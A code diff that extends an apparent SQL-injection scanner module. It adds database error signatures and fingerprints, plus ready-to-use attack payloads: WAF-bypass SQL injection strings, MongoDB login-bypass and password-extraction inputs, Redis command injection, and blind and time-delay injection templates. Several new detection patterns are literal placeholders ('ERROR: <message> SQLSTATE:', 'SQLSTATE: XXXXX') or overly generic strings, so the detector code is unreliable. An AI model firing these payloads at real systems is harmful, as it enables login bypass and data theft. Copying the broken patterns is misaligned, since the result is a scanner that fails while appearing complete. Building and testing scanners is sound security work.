@@ -1,6 +1,7 @@
 """
-SQL error patterns ported from AWVS10 classSQLInjection.inc
-66 plain-text patterns + 24 regex patterns covering all major DBs.
+SQL error patterns - AWVS10 base + 2018-2025 updates.
+90+ plain-text patterns + regex covering all major DBs + NoSQL.
+Updated: MariaDB, CockroachDB, CQL, cloud SQL, JSON WAF bypasses, NoSQL.
 """
 import re
 
@@ -15,6 +16,12 @@ MYSQL_ERRORS = [
     "Syntax error or access violation",
     "SQLSTATE[HY",
     "MySQL server version for the right syntax",
+]
+
+MARIADB_ERRORS = [
+    "check the manual that corresponds to your MariaDB server version",
+    "MariaDB server version for the right syntax",
+    "SQLSTATE[42000]",
 ]
 
 MSSQL_ERRORS = [
@@ -33,6 +40,7 @@ MSSQL_ERRORS = [
     "SQLServer JDBC Driver]",
     "com.jnetdirect.jsql",
     "Unclosed quotation mark",
+    "ISJSON",
 ]
 
 POSTGRESQL_ERRORS = [
@@ -46,6 +54,7 @@ POSTGRESQL_ERRORS = [
     "ERROR: parser: parse error at or near",
     "PostgreSQL.*ERROR",
     "PSQLException",
+    "json_typeof",
 ]
 
 ORACLE_ERRORS = [
@@ -72,6 +81,7 @@ SQLITE_ERRORS = [
     "SQLite3::query",
     "SQLite3::SQLException",
     "unrecognized token:",
+    "json_extract",
 ]
 
 DB2_ERRORS = [
@@ -86,6 +96,21 @@ INFORMIX_ERRORS = [
     "IfxException",
     "com.informix.jdbc",
     "SQLCODE=-",
+]
+
+COCKROACHDB_ERRORS = [
+    "ERROR: <message> SQLSTATE:",
+    "SQLSTATE: XXXXX",
+    "kv/kvserver",
+    "cockroach",
+]
+
+CASSANDRA_CQL_ERRORS = [
+    "InvalidRequest: Error from server: code=2200",
+    "SyntaxException: line",
+    "no viable alternative at input",
+    "InvalidQueryException",
+    "com.datastax.driver",
 ]
 
 GENERIC_ERRORS = [
@@ -103,16 +128,24 @@ GENERIC_ERRORS = [
     "Hibernate",
     "javax.persistence",
     "HibernateException",
+    "SQLSTATE\\[\\d+\\]",
+    "PDOException",
+    "Doctrine.*Exception",
+    "Sequelize.*Error",
+    "TypeORM.*error",
 ]
 
 ALL_PLAIN_PATTERNS = (
     MYSQL_ERRORS
+    + MARIADB_ERRORS
     + MSSQL_ERRORS
     + POSTGRESQL_ERRORS
     + ORACLE_ERRORS
     + SQLITE_ERRORS
     + DB2_ERRORS
     + INFORMIX_ERRORS
+    + COCKROACHDB_ERRORS
+    + CASSANDRA_CQL_ERRORS
 )
 
 REGEX_PATTERNS = [re.compile(p, re.IGNORECASE) for p in GENERIC_ERRORS]
@@ -135,6 +168,10 @@ DB_FINGERPRINTS = {
         "Warning: mysql_",
         "MySqlException",
     ],
+    "mariadb": [
+        "MariaDB server version",
+        "corresponds to your MariaDB",
+    ],
     "mssql": [
         "Driver][SQL Server]",
         "Unclosed quotation mark",
@@ -155,6 +192,15 @@ DB_FINGERPRINTS = {
         "SQLITE_ERROR",
         "unrecognized token",
     ],
+    "cockroachdb": [
+        "cockroach",
+        "kv/kvserver",
+    ],
+    "cassandra": [
+        "InvalidRequest: Error from server",
+        "SyntaxException",
+        "com.datastax",
+    ],
 }
 
 
@@ -165,3 +211,111 @@ def fingerprint_db(response_body: str) -> str:
             if p.lower() in body_lower:
                 return db_name
     return "unknown"
+
+
+# --- WAF BYPASS PAYLOADS (2022-2023 JSON-based, Team82/Claroty research) ---
+
+WAF_BYPASS_PAYLOADS = {
+    "json_mysql": [
+        "' OR JSON_CONTAINS('{\"a\":1}', '1', '$.a')-- -",
+        "' OR JSON_EXTRACT('{\"a\":1}', '$.a')=1-- -",
+        "' OR JSON_MERGE('[1,2]','[true,false]')-- -",
+    ],
+    "json_postgresql": [
+        "' OR json_typeof('1'::json)='number'-- -",
+    ],
+    "json_sqlite": [
+        "' OR json_extract('{\"a\":1}','$.a')=1-- -",
+    ],
+    "json_mssql": [
+        "' OR ISJSON('{\"a\":1}')=1-- -",
+    ],
+    "comment_fragment": [
+        "1+un/**/ion+se/**/lect+1,2,3--",
+        "/*!50000UNION*//*!50000SELECT*/1,2,3",
+        "1'/**/OR/**/1=1--",
+    ],
+    "space_replace": [
+        "1'%09OR%091=1--",
+        "1'%0aOR%0a1=1--",
+        "1'%0bOR%0b1=1--",
+        "1'%0cOR%0c1=1--",
+        "1'%a0OR%a01=1--",
+    ],
+    "double_encode": [
+        "%2527",
+        "%252f",
+        "%2522",
+    ],
+    "unicode_fullwidth": [
+        "%ef%bc%87",
+        "%ef%bc%82",
+    ],
+}
+
+# --- NOSQL INJECTION PATTERNS ---
+
+NOSQL_MONGODB_AUTH_BYPASS = [
+    ('{"username": {"$ne": ""}, "password": {"$ne": ""}}', "json"),
+    ('{"username": {"$gt": ""}, "password": {"$gt": ""}}', "json"),
+    ('{"username": {"$in": ["admin","root"]}, "password": {"$ne": "x"}}', "json"),
+    ("username=admin&password[$ne]=anything", "urlencoded"),
+    ("username[$ne]=x&password[$ne]=x", "urlencoded"),
+    ("username=admin&password[$regex]=.*", "urlencoded"),
+    ("username=admin&password[$gt]=", "urlencoded"),
+]
+
+NOSQL_MONGODB_EXTRACTION = [
+    '{"username": "admin", "password": {"$regex": "^{char}"}}',
+    '{"$where": "this.password.match(/^{char}/) != null"}',
+    '{"$where": "sleep(5000)"}',
+]
+
+NOSQL_REDIS = [
+    "\\r\\nSET injected_key injected_value\\r\\n",
+    'EVAL "redis.call(\'SET\',\'x\',\'pwned\')" 0',
+]
+
+NOSQL_ELASTICSEARCH = [
+    '{"query": {"match_all": {}}}',
+    '" OR "_exists_":password',
+]
+
+# --- BLIND SQLI FOR ORDER BY / LIMIT ---
+
+ORDER_BY_BLIND = {
+    "postgresql": [
+        "ORDER BY (CASE WHEN ({cond}) THEN 1 ELSE (SELECT 1/(SELECT 0)) END)",
+    ],
+    "mysql": [
+        "ORDER BY IF(({cond}),1,(SELECT 1 FROM information_schema.tables))",
+    ],
+    "mysql_limit": [
+        "LIMIT 1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,({expr}))))",
+    ],
+    "generic": [
+        "ORDER BY (CASE WHEN ({cond}) THEN 1 ELSE 2 END)",
+    ],
+}
+
+# --- TIME-BASED PAYLOADS (expanded) ---
+
+TIME_PAYLOADS_EXTENDED = {
+    "mysql": [
+        ("' AND IF(1=1,SLEEP({t}),0)-- -", "sleep"),
+        ("' OR BENCHMARK(10000000,SHA1('test'))-- -", "benchmark"),
+    ],
+    "postgresql": [
+        ("' OR (SELECT 4564 FROM PG_SLEEP({t}))-- -", "pg_sleep"),
+        ("' || (SELECT pg_sleep({t}))--", "pg_sleep"),
+    ],
+    "mssql": [
+        ("'; IF (SUBSTRING(@@VERSION,1,1)='M') WAITFOR DELAY '0:0:{t}'--", "waitfor"),
+    ],
+    "oracle": [
+        ("' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{t})--", "dbms_pipe"),
+    ],
+    "sqlite": [
+        ("' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--", "randomblob"),
+    ],
+}
